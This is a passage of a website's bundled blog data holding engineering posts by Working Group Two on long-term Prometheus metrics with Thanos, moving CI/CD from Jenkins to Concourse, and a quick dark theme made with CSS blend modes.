scraped every 15 or 30 seconds forever. At some point these\\nmetrics would no longer be useful to make sense of your metrics. This is where\\nthe Thanos Compactor comes in. It creates aggregates of old metrics based on rules. It will for example\\naggregate metrics that are older than 30 days into 5 minute chunks. This saves resources and still gives you\\nalmost the same accuracy when looking at longer timespans. After those metrics have been aggregated, they are\\nwritten back into the S3 bucket and the metadata gets updated.\\n\\n### Thanos Ruler\\nThe Ruler component is the Thanos equivalent of Recording Rules. It can look at all Store APIs and generate new metrics\\naccording to the Recording Rules fed into the Ruler component. However since this rule processing is not done against a\\nlocal datastore, it is possible that these new metric datapoints will not always be generated as it relies on a reliable\\ndata source to do this in the required intervals.\\n\\n## Architecture in a Cluster\\n\\n![Thanos Architecture](/img/blog/thanos/thanos_architecture.png)\\n\\nAs we can see, there are quite a few things going on in this architectural view of the system, but on the other hand it\\nis fairly simple to understand as the components are nicely decoupled from each other.\\n\\nAn interesting thing here is that the drawing has multiple Prometheus instances with multiple sidecars. Thanos actually\\nallows for deduplication of timeseries data. The data uploaded from the sidecars contains information about which prometheus\\ninstance the metrics are generated from, and adds that. The Querier can then deduplicate this data so that the metrics shown\\nin Grafana are consistent and do not come sometimes from Prometheus A and sometimes from Prometheus B.\\n\\nThis design also allows for an interesting other Use Case: querying multiple clusters. As\\nlong as the storage location used by the sidecars for uploading the metrics is identical, the time series data is\\navailable to the Thanos Store and therefor the Querier and Grafana.\\nThat even allows to run Grafana, Querier and Store in a completely different part of the world if need be.\\n\\n## Is it worth it?\\n\\n### Pros\\n- highly available Prometheus\\n- increased reliability (decoupled query component)\\n- infinite metric storage\\n- query multiple clusters from a single point\\n- easy to scale\\n\\n### Cons\\n- more complex architecture\\n- increased resource usage\\n\\n## What are the biggest benefits for us?\\n\\nAs stated in the beginning of this article one of our objectives for implementing Thanos was the increased\\nmetric retention to be able to look back further in time.\\n\\nThe most interesting features for us are to be able to:\\n- analyze trends and identify anomalies within the mobile core network\\n- visualize and graph service usage\\n- predict service usage on peak days (think New Years Eve)\\n- observe behaviour over multiple deployments (regions, customers and cloud providers)\\n\\n## Summary\\n\\nEven though Thanos comes with an increased architectural and operational complexity, we have to say after running it for a while, we think it is totally worth it. We can make architecture decisions by looking further\\nback in time than before. It also has the additional advantage that a misconfiguration of a Prometheus deployment\\ndoes not pull down the whole stack as Prometheus is HA and only updates one at a time. If the deployment fails,\\nwe can get notified and the deployment can be aborted. Also upgrades of the whole monitoring stack, can\\nnow be done gradually, which is also a great advantage for us!"},{"id":"replacing-jenkins-with-concourse","metadata":{"permalink":"/blog/replacing-jenkins-with-concourse","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2019-12-20-jenkins-to-concourse.md","source":"@site/../blog/2019-12-20-jenkins-to-concourse.md","title":"We killed the butler: Replacing Jenkins with Concourse","description":"At wgtwo, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:","date":"2019-12-20T00:00:00.000Z","formattedDate":"December 20, 2019","tags":[{"label":"infrastructure","permalink":"/blog/tags/infrastructure"},{"label":"CICD","permalink":"/blog/tags/cicd"},{"label":"devops","permalink":"/blog/tags/devops"}],"readingTime":5.11,"hasTruncateMarker":true,"authors":[{"name":"Anna Kennedy","title":"Tech Lead for Cloud and Edge Infrastructure","url":"https://www.linkedin.com/in/annaken","imageURL":"/img/author-photos/ak.jpg","key":"anna-kennedy"}],"frontMatter":{"slug":"replacing-jenkins-with-concourse","title":"We killed the butler: Replacing Jenkins with Concourse","date":"2019-12-20T00:00:00.000Z","tags":["infrastructure","CICD","devops"],"authors":"anna-kennedy"},"prevItem":{"title":"Towards observability nirvana: infinite metric retention with Thanos","permalink":"/blog/metrics-unlimited-thanos"},"nextItem":{"title":"Hacking dark themes with CSS blend modes","permalink":"/blog/hacking-dark-themes-with-css-blend-modes/"}},"content":"At **wgtwo**, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:\\n\\n\x3c!--truncate--\x3e\\n\\n* running unit tests on each pull request\\n* building and running integration tests with bazel on every merge to the monorepo\\n* building container images and upload them to the registry\\n* scanning all images for security flaws\\n* running acceptance tests in the staging environment\\n* syncing secrets between different sources\\n* notifying slack if changes are made in Kubernetes\\n\\nWe had been using [Jenkins](https://jenkins.io/) to run such pipelines, but having to configure it by navigating a web GUI made it difficult to maintain, redeploy, and upgrade, so we decided to look for alternatives.\\n\\n![Jenkins](/img/blog/jenkins-to-concourse/jenkins.png)\\n\\nThe majority of our code lives in a monorepo, and we use Bazel to manage builds and tests.\\nWe try to do all of our infrastructure configuration via [gitops](https://www.gitops.tech/) so it was important that a continuous integration and deployment system not only play nicely with our existing structures, but be itself configurable from code.\\n\\nWe spent time investigating other options, and eventually settled on **[Concourse](https://concourse-ci.org/), a cloud-native CI/CD server where tasks are deployed in containers, and config is stored as yaml**.\\n\\n\\n## Infrastructure as code\\n\\nWe run Concourse in Kubernetes, so the setup and configuration itself is all done with yaml files and kubectl. It\'s fast and easy to upgrade and redeploy.\\n\\nWithin Concourse, the pipeline configuration is entirely yaml-based; there are no buttons in the UI except for an abort/re-run button.\\n\\n```\\njobs:\\n- name: run-acceptance-tests-staging\\n  plan:\\n  - task: run-tests\\n    config:\\n      inputs:\\n      - name: monorepo\\n      run:\\n        path: /bin/bash -c runtests.sh\\n    on_failure:\\n      put: notify-slack-ci\\n```\\n\\n![Concourse task](/img/blog/jenkins-to-concourse/concourse_task.png)\\n\\nPipelines are made up of jobs that run in series or parallel; jobs consist of tasks.\\nPipelines, jobs and tasks are described in code and automatically visualised in the UI.\\nChanges to pipelines are applied by updating the yaml file and running Concourse\'s [fly cli](https://concourse-ci.org/fly.html) tool.\\n\\n\\n## Containerised deployment\\n\\nConcourse runs every job in its own container, which means that every job uses an entirely clean, reproducible environment. Any dependencies required for a task can be pre-installed in the image.\\nThis is a huge improvement for us over Jenkins, where dependencies were installed to the entire worker node, and artifacts from previous builds were left lying about on the server.\\n\\nWe use docker containers, and we also run Concourse itself as a container, which means a bit of docker-in-docker magic.\\nIt look a little work to build an image we were happy with, but beyond that it went surprisingly smoothly for us on the whole.\\nThe only drawback is that we have to run images in privileged mode, but in our self-managed Kubernetes cluster this isn\'t really too much of an issue.\\n\\nThere were some challenges in figuring out what resources needed to be allocated; we settled on three worker nodes and a maximum of 2 active tasks per worker. We see a little bit of slowness some afternoons when the pull-requests are coming thick and fast, but the cluster remains stable. It would be nice to set some autoscaling here to cope with short-term peaks in load.\\n\\n![Concourse pipeline](/img/blog/jenkins-to-concourse/concourse_pipeline.png)\\n\\n\\n## Debugging\\n\\nSince the tasks all run in containers, it\'s easy to debug issues locally by running the same image on the laptop as is running in Concourse.\\nAlternatively, the [fly execute](https://concourse-ci.org/tasks.html#running-tasks) cli tool runs a local project in a container in Concourse, a nice interim step when trying to get a deploy working.\\n\\nThe [fly intercept](https://concourse-ci.org/builds.html#fly-intercept) tool offers a way to log into a running container in concourse to troubleshoot:\\n\\n```\\n$ fly intercept -j ecs-services\\n1: build #27, step: monorepo, type: get\\n2: build #27, step: notify-slack-ci, type: get\\n3: build #27, step: notify-slack-ci, type: put\\n4: build #27, step: run-acceptance-tests-staging, type: task\\nchoose a container: 4\\nroot@02f69d15-b7be-4f2e-43f7-24f549071bb1:/tmp/build/3a58ea39#\\n\\n```\\n\\n## Resource types and extending Concourse\\n\\nThere are a large number of [resource types](https://github.com/concourse/concourse/wiki/Resource-Types) available for Concourse, making it fairly straightforwards to configure pipelines.\\n\\nAs resource types in Concourse are all based on containers, extending Concourse means introducing a new container that can be called from Concourse.\\n\\nA resource type needs to implement the following executables/scripts:\\n\\n* check (checking new versions of the resource, eg. is there a new pull request)\\n* in (pulling a new version of the resource down, eg. download code from a pull request)\\n* out (pushing a new version of the resource up, eg. push a build result to Github)\\n\\nThese binaries need to be placed under /opt/resource in the docker container.\\nConcourse calls these binaries with JSON payload and optional parameters that can all be found [here](https://concourse-ci.org/implementing-resource-types.html).\\nWhat is done in those executables/scripts is up to the implementer, but it is really easy to extend concourse using this mechanism.\\n\\n\\n## Learning curve\\n\\nThe move from Jenkins to Concourse has overall been a very positive step for us. If there has been any drawback it\'s that implementing any brand new system usually means something of a learning curve, and Concourse is no exception.\\n\\nThe documentation is sometimes a bit minimal, but now that we have a number of pipelines up and running we\'re finding it easier and easier to add more.\\nSimilarly, it took some time to settle on how to allocate resources such that we cope with load but aren\'t wasteful at quiet times.\\n\\n\\n## Summary\\n\\nThe biggest improvements of Concourse over Jenkins have been:\\n\\n* clean UI, no clicky clicky\\n* every build uses its own container - no shared dependencies or artifacts\\n* configuration of Concourse in code (in Kubernetes) - easy to upgrade and redeploy Concourse\\n* configuration of pipelines in code - good visibility into running tasks\\n* wide range of resource types\\n* ability to extend resources\\n* easy to troubleshoot and debug\\n\\nOverall, we\'re pretty pleased with Concourse. There are a few features we\'re eagerly awaiting in future releases, such as re-running targeted builds, but for the most part it has been relatively straightforwards to import all our existing jobs from Jenkins and add more.\\n\\n\\n## References\\n\\n* <https://github.com/concourse>\\n* <https://content.pivotal.io/blog/the-making-of-a-cloud-native-ci-cd-tool-the-concourse-journey>\\n* <https://github.com/karlkfi/concourse-dcind>\\n* <https://github.com/concourse/docker-image-resource/blob/master/assets/common.sh>\\n* <https://concoursetutorial.com>"},{"id":"hacking-dark-themes-with-css-blend-modes/","metadata":{"permalink":"/blog/hacking-dark-themes-with-css-blend-modes/","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2019-06-25-hacking-dark-themes-with-blend-modes.md","source":"@site/../blog/2019-06-25-hacking-dark-themes-with-blend-modes.md","title":"Hacking dark themes with CSS blend modes","description":"Like many other companies, Working Group Two has a number of applications which are","date":"2019-06-25T00:00:00.000Z","formattedDate":"June 25, 2019","tags":[{"label":"CSS","permalink":"/blog/tags/css"},{"label":"frontend","permalink":"/blog/tags/frontend"},{"label":"design","permalink":"/blog/tags/design"}],"readingTime":5.72,"hasTruncateMarker":true,"authors":[{"name":"David \xc5se","title":"Engineering Manager for Ecosystem","url":"https://linkedin.com/in/davidaase","imageURL":"/img/author-photos/daa.jpg","key":"david-\xe5se"}],"frontMatter":{"slug":"hacking-dark-themes-with-css-blend-modes/","title":"Hacking dark themes with CSS blend modes","date":"2019-06-25T00:00:00.000Z","tags":["CSS","frontend","design"],"authors":["david-\xe5se"]},"prevItem":{"title":"We killed the butler: Replacing Jenkins with Concourse","permalink":"/blog/replacing-jenkins-with-concourse"}},"content":"Like many other companies, [Working Group Two](/) has a number of applications which are\\nonly available internally or to partners.\\nOur UI designer (that\'s me) prefers light backgrounds with dark text, but one of our\\npartners have wanted a dark theme for one of our applications for some time.\\nWe haven\'t been able to prioritize this, but we were using CSS blend modes for a different project,\\nand wondered if we could use them to quickly put together a dark theme.\\n\\n\x3c!--truncate--\x3e\\n\\nThe application in this post is one of our partner portals, which follows the Material Design\\nguidelines. It\u2019s built with [Vue](https://vuejs.org/) and [Vuetify](https://vuetifyjs.com/en/),\\nbut also has some custom components and JS plugins (for uploads, charts, etc).\\nIt took two hours to create the dark theme and deploy it to production, and we\'ll walk\\nyou through the whole process (with screenshots) in this post.\\n\\n## What are CSS blend modes?\\nMozilla has a [page](https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode) which explains\\nthe concept fairly well. In short, blend modes decide what should happen when two colors are\\nput on top of each other. The default blend mode is `normal`, which is what most people are used to.\\nAs an example, the `normal` blend mode paints dark text on top of a light background on the\\npage you\u2019re reading right now.\\n\\nThe application we have is light and we want it to be dark, so we need to look for blend modes that\\ncan help with that. Scrolling through the [list at MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode),\\none mode in particular stands out:\\n\\n```\\ndifference\\n    The final color is the result of subtracting the darker of the two colors from the lighter one.\\n    A black layer has no effect, while a white layer inverts the other layer\'s color.\\n```\\n\\n![Starting point, mostly basic Vuetify](/img/blog/blend-modes/01-console-subs-light.png)\\n![After applying](/img/blog/blend-modes/01-console-subs-difference.png)\\n\\nOkay, that\u2019s actually not too bad. There are some obvious issues, like the color hues being\\ninverted and everything being way too dark, but it should be possible to make some adjustments.\\n\\n## Working with a non-standard blend mode\\nThe most jarring issue is that the colors have been inverted.\\nOur teal logo is now red, and the red \\"unlocked account\\" icon we use in development mode is now teal.\\nThis is in line with the documentation for the `difference` blend mode, but luckily CSS also supports hue-rotation,\\nso we can just rotate the hue back 180 degrees. Our base style now looks like this:\\n\\n```css\\nhtml.dark-mode {\\n   mix-blend-mode: difference;\\n   filter: hue-rotate(180deg);\\n}\\n```\\n\\nHue is measured in degrees from 0 to 360, so we\'re flipping the hues twice.\\nBelow, you can see a color wheel with no effects (1), with blend-mode (2), and with blend mode and hue rotate (3).\\nAll the effects are applied to the same image here in your browser.\\n\\n\x3c!-- ![](/img/blog/blend-modes/color-mode-all.png) --\x3e\\n\\nAs you can see from the illustration, brightness and saturation\\nis not accounted for with hue-rotate, so most colors won\'t look the same.\\nThey will have the same hue though, so semantic meaning (red = danger, green = safe) is preserved.\\\\\\\\\\nWe\'re lucky that our brand color doesn\'t change too much!\\n\\nSo, this fixes our colors, but we also have to do something about the darkness.\\nThe whole application is pretty much pitch black, and to make it brighter we need to \u2026 turn down the brightness:\\n\\n```css\\nhtml.dark-mode {\\n   mix-blend-mode: difference;\\n   filter: hue-rotate(180deg) brightness(0.67);\\n}\\n```\\n\\nLet\'s have a look <small>(click to enlarge)</small>:\\n\\n\x3c!-- <div class=\\"uk-child-width-1-2 uk-child-width-1-2@s bordered-gallery\\" uk-grid uk-lightbox=\\"animation: fade\\">\\n    {% include image.html url=\\"/img/blog/blend-modes/01-console-subs-light.png\\" caption=\\"Starting point, mostly basic Vuetify\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/01-console-subs-difference-filters.png\\" caption=\\"After applying blend mode and filters\\"%}\\n</div> --\x3e\\n\\nThat\u2019s a lot better (blend modes are fun!). Our dark theme is close to done now,\\nbut we have one problem remaining: shadows. Because of our blend mode, making\\nthings darker means making them brighter, so all our shadows look like white glows.\\nSince our base color is white/light gray, we can\u2019t simply change our shadows to white as there would be no contrast.\\nOur solution was to embrace the \u201cglow\u201d feel and change the shadows to brand colored glows <small>(click to enlarge)</small>:\\n\\n\x3c!-- <div class=\\"uk-child-width-1-2 uk-child-width-1-2@s bordered-gallery\\" uk-grid uk-lightbox=\\"animation: fade\\">\\n    {% include image.html url=\\"/img/blog/blend-modes/02-console-shadows-light.png\\" caption=\\"Normally, the menu creates a shadow on the background\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/02-console-shadows-glow.png\\" caption=\\"More of a glow than a shadow\\"%}\\n</div> --\x3e\\n\\nAs you might have noticed in the previous screenshot, we also made some other adjustments.\\nWe made the logo white using a brightness filter, and we set the base font-weight to 700 (bold),\\nsince contrast is lower in the dark theme.\\n\\n## More comparison screenshots\\nThe following gallery shows some screenshots with custom components and JavaScript plugins.\\nNo additional CSS was written for any of the views <small>(click to enlarge)</small>:\\n\\n\x3c!-- <div class=\\"uk-child-width-1-3 uk-child-width-1-6@s bordered-gallery\\" uk-grid uk-lightbox=\\"animation: fade\\">\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-blacklist-light.png\\" caption=\\"A standard Vuetify data table\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-blacklist-dark.png\\" caption=\\"It\'s not perfect in dark mode, but it works\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-batch-light.png\\" caption=\\"Our upload component is custom, not related to Vuetify\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-batch-dark.png\\" caption=\\"Blend mode covers all parts of the app\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-stats-light.png\\" caption=\\"Charts are built with Charts.js\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-stats-dark.png\\" caption=\\"Charts also look okay\\"%}\\n</div> --\x3e\\n\\n## Conclusion\\nAll in all, it took around two hours to create this dark theme. Most of the time was\\nspent experimenting with different settings to get acceptable contrast ratios.\\nThere are probably better ways of doing this, but this was incredibly quick,\\nand allowed us to deliver something we normally wouldn\'t be able to deliver.\\nOther than the shadows, nothing is particularly ugly, so we consider this a success.\\nThe whole style sheet is just a couple of selectors :\\n\\n\\n```css\\nhtml.dark-mode {\\n    mix-blend-mode: difference;\\n    filter: brightness(0.67) hue-rotate(180deg);\\n    font-weight: 700 !important;\\n}\\n\\n/* Glow for dropdown/card-hover*/\\n.dark-mode .v-menu__content,\\n.dark-mode .v-card--hover:hover {\\n    box-shadow: 0 5px 20px rgba(142, 255, 252, 0.74);\\n}\\n\\n.dark-mode .logo {\\n    filter: brightness(0);\\n}\\n```\\n\\nThanks for reading!\\n\\n## FAQ\\n\\n*\u201cMany CSS frameworks have a dark-mode, why not use that?\u201d*\\\\\\\\\\nVuetify also has a dark-mode. Most of the components they offer look okay in dark-mode, but we would have\\nto write custom CSS for our own components, and for other libraries we\u2019re using (primarily for charts).\\nThe great thing about the blend-mode hack is that is operates independently of any framework.\\nYou set it on an HTML tag and it treats everything the same way.\\n\\n*\u201cWhat about accessibility?\u201d*\\\\\\\\\\nYeah, this isn\'t great for accessibility. Since we\'re lowering the brightness to 67% we\'re losing a lot of contrast.\\nWe increased the font-weight to mitigate the effects of this, but you shouldn\'t use this technique for your primary theme.\\n\\n*\u201cWhat about browser support?\u201d*\\\\\\\\\\nSupported in modern browsers, except Edge.\\nThere\'s a [detailed table](https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode#Browser_Compatibility) available on MDN.\\n\\n*\u201cWhat about performance?\u201d*\\\\\\\\\\nWe haven\'t had any problems with performance, but some readers noted that they tried\\nthe trick on a complex website (Jira), which resulted in sluggish behavior."}]}')}}]);